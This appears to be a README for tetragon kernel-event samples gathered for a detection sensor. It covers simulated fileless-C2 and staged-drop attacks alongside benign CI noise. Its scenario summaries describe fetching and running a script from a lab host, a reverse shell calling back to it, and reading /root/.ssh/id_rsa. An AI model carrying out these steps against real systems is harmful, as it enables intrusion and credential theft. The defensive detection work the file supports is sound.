# 传感器原料样本 (tetragon 实抓)

在 node-a 上用 tetragon v1.7.0 抓取的真实内核事件,作为 SysArmor 传感器原料样本。
两套拓扑(容器/VM)均已重新采集。

## 采集配置

- 进程事件: tetragon `__base__` sensor (process_exec / process_exit),自带 `exec_id` / `parent_exec_id` = lineage 戳。
- syscall 事件: TracingPolicy `sysarmor-syscall-capture` (见 `../env/resources/syscall-capture.yaml`),
  kprobe `security_socket_connect` + `security_file_permission`。
- 两拓扑共用一份 TracingPolicy。

## 样本文件

| 文件 | 拓扑 | 行数 | 关键事件 |
|---|---|---|---|
| apt-fileless-c2.container.tetragon.jsonl | 容器 | 2287 | curl→:8080, bash→:443, cat→/root/.ssh/id_rsa |
| apt-fileless-c2.vm.tetragon.jsonl | VM | 63 | curl→10.66.0.99:8080, bash→10.66.0.99:443, cat→/root/.ssh/id_rsa |
| apt-staged-drop.container.tetragon.jsonl | 容器 | 4241 | 阶段1 curl→:8080, 阶段2 bash→:443 |
| apt-staged-drop.vm.tetragon.jsonl | VM | 24 | 阶段1 curl→10.66.0.99:8080, 阶段2 bash→10.66.0.99:443 |
| benign-ci-noise.container.tetragon.jsonl | 容器 | 1838 | curl→:8080 ×N (拉依赖), 无敏感文件读 |
| benign-ci-noise.vm.tetragon.jsonl | VM | 73 | curl→10.66.0.99:8080 ×6, 无敏感文件读 |

### 两拓扑事件量差异

容器拓扑行数远多于 VM,因为 tetragon `--pid=host` 捕获了宿主上所有进程(vscode-server、sysarmor-prism、sysbox 等)。
VM 拓扑 tetragon 只看 VM 内核上的进程,天然隔离,事件流更干净。

VM 样本能更清晰地展示攻击谱系,容器样则需要按 docker ID 或 10.66.0.x 过滤才能看到攻击事件。

### 各场景 VM 拓扑事件摘要

**apt-fileless-c2** (21 exec + 19 kprobe):
```
谱系: entrypoint → bash → curl 10.66.0.99:8080/x.sh
                 → bash /dev/shm/x.sh → bash -i (反弹 shell)
                                          → cat /root/.ssh/id_rsa (后渗透)
kprobe: security_socket_connect  curl → 10.66.0.99:8080  (下载)
        security_socket_connect  bash → 10.66.0.99:443   (C2 回连)
        security_file_permission cat  → /root/.ssh/id_rsa (凭据窃取)
```

**apt-staged-drop** (VM, 2 exec + 2 kprobe):
```
lineage A: curl 10.66.0.99:8080/helper → 写入 /var/lib/app/plugins/helper
           ──── 间隔 ────
lineage B: /var/lib/app/plugins/helper --report → bash 10.66.0.99:443

kprobe: security_socket_connect  curl → 10.66.0.99:8080  (下载)
        security_socket_connect  bash → 10.66.0.99:443   (回连)
```

**benign-ci-noise** (VM, 30 exec + 18 kprobe):
```
CI 轮次 ×3: curl 10.66.0.99:8080 (拉依赖) → 构建 → 写 artifact

kprobe: security_socket_connect  curl → 10.66.0.99:8080 ×6
        security_file_permission (无敏感路径命中)
```

## 复现

```bash
# 容器拓扑
make up
make capture SCENARIO=apt-fileless-c2

# VM 拓扑
make up TOPO=vm
make capture TOPO=vm SCENARIO=apt-fileless-c2
```

事件样例的详细 JSON 字段说明见 `../SCENARIOS.md`。
